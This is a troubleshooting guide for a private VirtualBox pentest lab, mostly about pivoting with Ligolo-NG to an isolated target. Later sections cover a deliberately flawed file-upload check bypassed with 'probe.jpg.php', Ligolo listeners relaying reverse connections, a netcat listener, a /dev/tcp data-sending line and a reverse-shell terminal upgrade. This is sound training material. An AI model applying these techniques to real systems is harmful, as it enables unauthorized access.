# Enterprise Pivot Lab --- Troubleshooting

This document records problems encountered while building and validating
the Enterprise Pivot Lab.

The goal is to preserve known fixes and provide a systematic way to
distinguish VirtualBox, Linux networking, application, and Ligolo-NG
problems.

## Troubleshooting Philosophy

Debug the lab one network boundary at a time.

For Scenario 01, validate:

``` text
Kali
  |
  v
WEB01
  |
  v
CORP-LAN
  |
  v
TARGET01
```

before debugging an application running on TARGET01.

For reverse connections, validate:

``` text
TARGET01
  |
  v
WEB01 Ligolo listener
  |
  v
Kali
```

before debugging the reverse-shell payload itself.

A useful general rule is to prove the network path first and the
application behavior second.

## Kali Cannot Reach WEB01

The expected direct path is:

``` text
10.10.10.10 -> 10.10.10.20
```

On Kali:

``` bash
ip -br addr
```

Verify that the LAB-EXT interface has:

``` text
10.10.10.10/24
```

Then inspect the routing table:

``` bash
ip route
```

Verify that `10.10.10.0/24` is directly connected through the LAB-EXT
interface.

Test WEB01:

``` bash
ping -c 2 10.10.10.20
```

If this fails, inspect the VirtualBox configuration.

Both Kali and WEB01 must have adapters attached to:

``` text
Internal Network: LAB-EXT
```

The Internal Network names must match exactly.

Also verify that `Cable Connected` is enabled for both adapters.

## Kali LAB-EXT Configuration Disappears After Reboot

The LAB-EXT interface should be configured through NetworkManager rather
than only with temporary `ip addr` commands.

Create a persistent connection:

``` bash
sudo nmcli connection add \
  type ethernet \
  ifname eth1 \
  con-name LAB-EXT \
  ipv4.method manual \
  ipv4.addresses 10.10.10.10/24 \
  ipv4.never-default yes \
  ipv6.method disabled
```

Activate it:

``` bash
sudo nmcli connection up LAB-EXT
```

Verify:

``` bash
nmcli connection show
ip -br addr
```

## Kali Loses Internet Access

LAB-EXT must not become Kali's default route.

Check:

``` bash
ip route
```

The default route should normally use Kali's VirtualBox NAT interface.

Inspect the LAB-EXT NetworkManager profile:

``` bash
nmcli connection show LAB-EXT | \
  grep -E 'ipv4.method|ipv4.addresses|ipv4.never-default'
```

Verify that:

``` text
ipv4.never-default: yes
```

If necessary:

``` bash
sudo nmcli connection modify \
  LAB-EXT \
  ipv4.never-default yes
```

Then reactivate the connection:

``` bash
sudo nmcli connection down LAB-EXT
sudo nmcli connection up LAB-EXT
```

## WEB01 Cannot Reach TARGET01

Inspect WEB01:

``` bash
ip -br addr
ip route
```

WEB01 should have:

``` text
10.10.10.20/24
172.16.10.10/24
```

TARGET01 should have:

``` text
172.16.10.20/24
```

The corresponding WEB01 and TARGET01 VirtualBox adapters must both be
attached to:

``` text
Internal Network: CORP-LAN
```

From WEB01:

``` bash
ping -c 2 172.16.10.20
```

If WEB01 cannot directly reach TARGET01, fix CORP-LAN before
troubleshooting Ligolo.

## TARGET01 Needs Internet During Provisioning

TARGET01 is intentionally isolated in the completed lab, but package
installation may temporarily require Internet access.

While TARGET01 is powered off, add a temporary NAT adapter from the
VirtualBox host:

``` bash
VBoxManage modifyvm "TARGET01" \
  --nic2 nat \
  --cable-connected2 on
```

Boot TARGET01 and complete provisioning.

After provisioning, shut it down:

``` bash
sudo poweroff
```

Then remove the temporary NAT adapter from the VirtualBox host:

``` bash
VBoxManage modifyvm "TARGET01" \
  --nic2 none
```

Boot TARGET01 again and verify that Northstar still works without
Internet access.

## VirtualBox Reports Invalid Network Settings

If changing adapters through the GUI produces invalid settings,
completely power off the VM and inspect its configuration from the host:

``` bash
VBoxManage showvminfo "TARGET01"
```

To focus on networking:

``` bash
VBoxManage showvminfo "TARGET01" | \
  grep -iE 'NIC|Attachment|Cable'
```

Then modify the powered-off VM with `VBoxManage`.

For example:

``` bash
VBoxManage modifyvm "TARGET01" \
  --nic2 nat \
  --cable-connected2 on
```

Virtual network changes are easier to reason about when the VM is fully
powered off rather than suspended or running.

## Garuda Cannot Directly Reach the Lab VMs

This is expected with the current topology.

LAB-EXT and CORP-LAN use VirtualBox Internal Network mode. The Garuda
host does not automatically receive an interface on either network.

Therefore, the host should not be expected to directly reach addresses
such as:

``` text
10.10.10.20
172.16.10.20
```

Kali is the attack host and transfer point for the isolated lab.

Conceptually:

``` text
Garuda
   |
   | Git / repository work
   v
Kali
   |
   | LAB-EXT / Ligolo
   v
Lab VMs
```

## SSH Hangs

During lab development, an SSH connection problem was resolved by
disabling IP QoS marking for the connection.

Try:

``` bash
ssh -o IPQoS=none user@HOST
```

Before assuming SSH itself is broken, verify basic connectivity:

``` bash
ping -c 2 HOST
nmap -Pn -p 22 HOST
```

If `IPQoS=none` consistently resolves the problem, it can be used for
the affected lab connection.

## Ligolo Proxy Fails with TUNSETIFF

A common symptom is an error involving:

``` text
TUNSETIFF
operation not permitted
```

The proxy does not have sufficient privileges to create its TUN
interface.

Stop the unprivileged proxy and restart it with:

``` bash
sudo ligolo-proxy -selfcert
```

This is the known-good configuration for the current lab.

## Ligolo Agent Cannot Connect

First verify that the proxy is running on Kali:

``` bash
sudo ss -lntp | grep 11601
```

The proxy should have been started with:

``` bash
sudo ligolo-proxy -selfcert
```

Verify that WEB01 can reach Kali:

``` bash
ping -c 2 10.10.10.10
```

Then connect from WEB01:

``` bash
/tmp/ligolo-agent \
  -connect 10.10.10.10:11601 \
  -ignore-cert
```

If the binary does not execute, inspect it:

``` bash
ls -l /tmp/ligolo-agent
file /tmp/ligolo-agent
```

Ensure it is executable:

``` bash
chmod +x /tmp/ligolo-agent
```

## Ligolo Agent Is Connected but TARGET01 Is Unreachable

An agent connection alone does not create the route to CORP-LAN.

In the Ligolo console:

``` text
session
```

Select WEB01.

Inspect the networks visible to it:

``` text
ifconfig
```

Confirm that WEB01 has:

``` text
172.16.10.10/24
```

Then run:

``` text
autoroute
```

Select the `172.16.10.0/24` network and create/start the `ligolo-web01`
tunnel.

On Kali:

``` bash
ip link show ligolo-web01
ip route | grep 172.16.10
```

Expected:

``` text
172.16.10.0/24 dev ligolo-web01
```

## `ip route get` Shows an Unexpected Source Address

A working route check may resemble:

``` text
172.16.10.20 dev ligolo-web01 src 10.0.2.15
```

The source address may initially look suspicious.

For this check, the important portion is:

``` text
dev ligolo-web01
```

That confirms Linux selected the Ligolo route.

Verify actual connectivity:

``` bash
ping -c 2 172.16.10.20
curl http://172.16.10.20/
```

If those commands work and the route uses `ligolo-web01`, the tunnel is
functioning.

## Nmap Reports TARGET01 as Down

Host discovery can be misleading across tunnels.

Use:

``` bash
nmap -Pn 172.16.10.20
```

For targeted service detection:

``` bash
nmap -Pn -sV -p 22,80 172.16.10.20
```

`-Pn` tells Nmap to treat the target as online rather than requiring its
normal host-discovery phase to succeed.

## Northstar Does Not Load

On TARGET01:

``` bash
systemctl is-active apache2
```

Expected:

``` text
active
```

If Apache is not active:

``` bash
sudo systemctl restart apache2
systemctl status apache2 --no-pager
```

Validate the Apache configuration:

``` bash
sudo apache2ctl configtest
```

Then test Northstar locally:

``` bash
curl http://127.0.0.1/
```

If local access works but remote access does not, troubleshoot
networking rather than the Northstar application.

## Northstar Does Not Survive a Reboot

Northstar is not a standalone systemd service. Apache hosts the
application.

Verify:

``` bash
systemctl is-enabled apache2
systemctl is-active apache2
```

Expected:

``` text
enabled
active
```

Verify the application files:

``` bash
ls -la /var/www/northstar
```

Verify the enabled Apache sites:

``` bash
ls -l /etc/apache2/sites-enabled/
```

The Northstar site should remain enabled.

## MediaTools Rejects an Upload

First verify the upload endpoint:

``` text
/media/
```

Test with an ordinary allowed file:

``` bash
echo test > test.jpg
curl -s \
  -F 'media=@test.jpg' \
  http://172.16.10.20/media/
```

If the upload fails, inspect the upload directory on TARGET01:

``` bash
ls -ld /var/www/northstar/uploads
```

It should be writable by the Apache service account.

Check the Apache error log:

``` bash
sudo tail -n 50 \
  /var/log/apache2/northstar-error.log
```

## PHP Probe Uploads but Does Not Execute

Confirm that the uploaded filename ends in `.php`.

The deliberately vulnerable MediaTools validation accepts a filename
such as:

``` text
probe.jpg.php
```

A harmless PHP execution probe is:

``` php
<?php
echo "NORTHSTAR_PHP_EXECUTION_OK";
?>
```

Request the uploaded file directly:

``` bash
curl http://172.16.10.20/uploads/probe.jpg.php
```

Expected:

``` text
NORTHSTAR_PHP_EXECUTION_OK
```

If the PHP source is returned literally rather than executed, inspect
Apache's PHP configuration.

## PHP Executes but the Reverse Connection Does Not Arrive

First confirm code execution with the harmless PHP probe.

Do not debug an interactive payload until:

``` text
NORTHSTAR_PHP_EXECUTION_OK
```

has been successfully returned.

Then examine the network path.

A callback directly from TARGET01 to Kali at:

``` text
10.10.10.10
```

is not expected to work in the final Scenario 01 topology.

TARGET01 can directly reach WEB01 at:

``` text
172.16.10.10
```

Use a Ligolo listener on WEB01 to relay the connection back to Kali.

## `listener_list` Is Empty

This problem occurred during Scenario 01 development.

If:

``` text
listener_list
```

returns an empty table, there is no active agent-side listener.

With the WEB01 session selected, recreate it:

``` text
listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:4445 --tcp
```

Immediately verify:

``` text
listener_list
```

Do not continue debugging the application payload until the listener
appears.

If needed, explicitly bind the listener to WEB01's CORP-LAN address:

``` text
listener_add --addr 172.16.10.10:4445 --to 127.0.0.1:4445 --tcp
```

Then verify again:

``` text
listener_list
```

## Test the Ligolo Listener Without a Reverse Shell

Start the final listener on Kali:

``` bash
rlwrap nc -lvnp 4445
```

From TARGET01, send harmless test data to the WEB01 listener:

``` bash
timeout 3 bash -c \
  'echo TEST_FROM_TARGET01 > /dev/tcp/172.16.10.10/4445'
```

Kali should receive:

``` text
TEST_FROM_TARGET01
```

If this succeeds, the Ligolo relay is functioning. A remaining failure
is more likely to involve the application payload than the network path.

## Reverse Shell Connects but Is Difficult to Use

A raw Bash/netcat shell may lack normal terminal behavior.

From the remote shell:

``` bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press `Ctrl-Z`.

On Kali:

``` bash
stty raw -echo; fg
```

Then:

``` bash
export TERM=xterm
export SHELL=/bin/bash
```

If the Kali terminal becomes corrupted afterward:

``` bash
reset
```

## TARGET01 Still Has Internet Access

Inspect TARGET01:

``` bash
ip -br addr
ip route
```

If an additional NAT interface still exists, power off TARGET01.

From the VirtualBox host:

``` bash
VBoxManage showvminfo "TARGET01" | \
  grep -iE 'NIC|Attachment|Cable'
```

Remove the temporary adapter:

``` bash
VBoxManage modifyvm "TARGET01" \
  --nic2 none
```

Boot TARGET01 again and verify.

The intended final configuration is:

``` text
CORP-LAN    172.16.10.20/24
NAT         disabled
```

## TARGET01 Works Before Reboot but Not After

First verify that its network configuration survived:

``` bash
ip -br addr
```

Confirm:

``` text
172.16.10.20/24
```

Then check Apache:

``` bash
systemctl is-enabled apache2
systemctl is-active apache2
```

Test locally:

``` bash
curl http://127.0.0.1/
```

If local Northstar access works but Kali cannot reach it, restore the
Ligolo pivot before diagnosing the application.

Kali's Ligolo route is temporary and must be recreated after the proxy,
agent, or tunnel has stopped.

## SCP from Garuda to an Internal VM Does Not Work

The Garuda host is not attached to the VirtualBox Internal Networks.

Use Kali as the transfer point.

For example, once the pivot is active:

``` bash
scp -r \
  scenarios/01-basic-pivot/target01 \
  debian@172.16.10.20:/tmp/
```

Do not put shell placeholder brackets around the username.

Incorrect:

``` text
<debian>@172.16.10.20
```

The shell interprets `<` as redirection syntax.

Correct:

``` text
debian@172.16.10.20
```

## Git Commit Has the Wrong Author

Before committing:

``` bash
git config user.name
git config user.email
```

Inspect the latest commit:

``` bash
git log -1 --format=fuller
```

If the latest local commit has the wrong identity and rewriting it is
appropriate:

``` bash
git commit --amend --no-edit --reset-author
```

For multiple commits, use an interactive rebase carefully.

After rewriting commits, verify the history:

``` bash
git log --all \
  --format='%H | AUTHOR: %an <%ae> | COMMITTER: %cn <%ce>'
```

Confirm that the unwanted identity is no longer present before pushing
rewritten history.

## Git Opens the Wrong Editor

If Git is configured with an unavailable or invalid editor command,
temporarily specify a known editor:

``` bash
GIT_EDITOR=nano git rebase -i HEAD~5
```

A permanent editor can be configured with:

``` bash
git config --global core.editor nano
```

Use whichever editor is preferred and actually installed on the host.

## A Repository Clone Is Behind

Check:

``` bash
git status
git log --oneline -5
```

Fetch the remote state:

``` bash
git fetch origin
```

Inspect the result:

``` bash
git status
```

If the working tree is clean and the branch is simply behind:

``` bash
git pull --ff-only
```

Using `--ff-only` avoids creating an unnecessary merge commit when only
straightforward synchronization is required.

## Clean Up Test Uploads Before a Snapshot

Before creating a clean Scenario 01 snapshot, remove disposable test
uploads from TARGET01 while preserving the `.gitkeep` file if it is part
of the deployment.

Inspect:

``` bash
ls -la /var/www/northstar/uploads/
```

Remove only files created during testing.

Also remove temporary Ligolo binaries or other provisioning artifacts if
they are not intended to be part of the baseline:

``` bash
rm -f /tmp/ligolo-agent
```

The goal is for a clean snapshot to contain the vulnerable application
and intended configuration, not artifacts from the previous solution
run.

## General Network Diagnostic Order

For most lab networking problems, work through this sequence:

``` text
1. VirtualBox adapter
        |
2. Linux interface
        |
3. Linux address
        |
4. Linux route
        |
5. Direct neighbor connectivity
        |
6. Ligolo agent
        |
7. Ligolo TUN interface
        |
8. Ligolo route
        |
9. TCP service
        |
10. Application
```

Useful commands include:

``` bash
ip -br addr
ip route
ip route get TARGET
ping -c 2 TARGET
ss -lntp
nmap -Pn TARGET
curl http://TARGET/
```

Do not skip directly to application debugging if the underlying network
path has not been proven.

## Reverse-Connection Diagnostic Order

For reverse connections through the pivot:

``` text
1. Confirm code execution
        |
2. Confirm target can reach pivot
        |
3. Confirm Ligolo agent session
        |
4. Confirm Ligolo listener exists
        |
5. Confirm Kali listener exists
        |
6. Send harmless test data
        |
7. Attempt interactive payload
```

This prevents wasting time changing payloads when the actual problem is
a missing listener or route.

## Known-Good Scenario 01 Checks

### Kali Before Pivoting

``` bash
ip -br addr
ip route
ping -c 2 10.10.10.20
```

### WEB01

``` bash
ip -br addr
ip route
curl http://127.0.0.1:8080/
ping -c 2 172.16.10.20
```

### TARGET01

``` bash
ip -br addr
systemctl is-enabled apache2
systemctl is-active apache2
curl http://127.0.0.1/
```

### Kali After Establishing Ligolo

``` bash
ip link show ligolo-web01
ip route get 172.16.10.20
nmap -Pn -sV -p 22,80 172.16.10.20
curl http://172.16.10.20/
```

### Reverse Connections

In the Ligolo console:

``` text
listener_list
```

On Kali:

``` bash
ss -lntp | grep 4445
```

These checks provide a known-good baseline before deeper
troubleshooting.
